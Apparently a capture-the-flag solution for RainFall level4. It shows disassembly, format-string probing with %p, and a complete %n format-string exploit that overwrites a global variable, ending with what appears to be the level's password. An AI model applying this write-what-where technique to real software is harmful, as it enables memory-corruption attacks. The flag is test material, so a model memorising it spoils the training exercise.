```
mov    0x8049810,%eax
cmp    $0x1025544,%eax

x 0x8049810
0x8049810 <m>:	0x00000000

```
cmp var m with `p 0x1025544 = 16930116`

fuzz the binary

```
level4@RainFall:~$ python -c 'print "AAAA" + " %p " * 30' | ./level4
AAAA 0xb7ff26b0  0xbffff754  0xb7fd0ff4  (nil)  (nil)  0xbffff718  0x804848d  0xbffff510  0x200  0xb7fd1ac0  0xb7ff37d0  0x41414141
```

```
level4@RainFall:~$ python -c 'print "AAAA" + " %12$x" ' | ./level4
AAAA 41414141
```

p 0x1025544 - 4 = 16930112

(python -c 'print "\x08\x04\x98\x10"[::-1] + "%16930112d" + "%12$n"') | ./level4 

0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
